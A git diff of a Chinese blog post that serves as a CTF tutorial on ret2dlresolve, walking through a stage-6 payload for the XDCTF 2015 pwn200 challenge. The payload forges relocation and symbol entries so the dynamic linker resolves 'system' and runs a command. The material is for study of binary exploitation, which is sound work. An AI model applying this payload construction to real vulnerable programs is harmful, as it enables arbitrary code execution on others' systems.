@@ -8,7 +8,6 @@ feature:  https://p0.ssl.qhimg.com/t01a969a8d998ad5508.png
 comments: true
 ---
 
-
 # 从壹开始做ret2dlresolve
 
 注意：full relro 的binary 是不会延迟绑定的……也意味着无法修改got表……
@@ -177,7 +176,7 @@ rett用main函数地址就行了，也是在ida里找
 
 我觉得复习得差不多了，下面开始dlresolve。
 
-[此处有配图，1+1的那张]
+![](https://github.com/RhythmMark/RhythmMark.github.io/blob/master/_posts/pictures/tryit.jpg?raw=true)
 
 ---
 先推荐一篇文章：
@@ -204,6 +203,8 @@ leave：mov esp,ebp;pop ebp
 #### [stack pivoting ](http://tacxingxing.com/2017/05/10/stack-pivot/)
 
 ![](http://tacxingxing.com/wp-content/uploads/2018/01/15136516601572.jpg)
+
+### 0x2 
 
 买五赠一，附送一个[XDCTF 2015 的 pwn200](http://pwn4.fun/2016/11/09/Return-to-dl-resolve/)的payload讲解
 
@@ -312,10 +313,66 @@ gdb-peda$ x/5i 0x804861b
 
 因此运行这个输出/bin/sh。（看不到的话在脚本里开下``context.log_level = "debug"``）
 
+顺水推舟（？）讲下stage2 到 6 做了什么吧。主要就是修改payload2，达到：
+
+>1.控制eip为PLT[0]的地址，只需传递一个index_arg参数
+2.控制index_arg的大小，使reloc的位置落在可控地址内
+3.伪造reloc的内容，使sym落在可控地址内
+4.伪造sym的内容，使name落在可控地址内
+5.伪造name为任意库函数，如system
+
+的目的
+
+#### stage6
+
+```
+payload2 = 'AAAA'
+payload2 += p32(plt_0)
+payload2 += p32(index_offset)
+payload2 += 'AAAA'
+payload2 += p32(base_stage + 80)
+payload2 += 'aaaa'
+payload2 += 'aaaa'
+payload2 += fake_reloc # (base_stage+28)的位置
+payload2 += 'B' * align
+payload2 += fake_sym # (base_stage+36)的位置
+payload2 += "system\x00"
+payload2 += 'A' * (80 - len(payload2))
+payload2 += cmd + '\x00'
+payload2 += 'A' * (100 - len(payload2))
+```
+
+建议把最开始放的那张图打印出来对着看（不
+
+plt[0]存放的是：
+
+```
+push    ds:dword_804A004
+jmp     ds:dword_804A008
+```
+而jmp的地址就是``_dl_runtime_resolve()``函数的地址
+
+所以会执行_dl_runtime_resolve(link_map,reloc_arg)
+
+而这里的``reloc_arg``就是``payload2 += p32(index_offset)``中的``index_offset``
+
+又因为
+
+``index_offset = (base_stage + 28) - rel_plt``
+
+所以，执行``_dl_runtime_resolve()``的时候——
+
+请读者自行理解。
 
 ## Start
 
 由于出题人 **过于友好**，我手上的这道题，buf大小为0x28，读入0x40个字符，即只溢出了**24**个bytes，不能像上面那道题一样一上来就能发送0x4d大小的字符串……
 
 那怎么办呢，那我就跑路了（×）
+
+![](http://5b0988e595225.cdn.sohucs.com/images/20181021/54c568f78c4f4cf5839215ff92430f52.gif)
+
+江湖不见
+
+想知道怎么做看[这里](https://delcoding.github.io/2019/01/ret2dl_resolve_x86/)好了
 
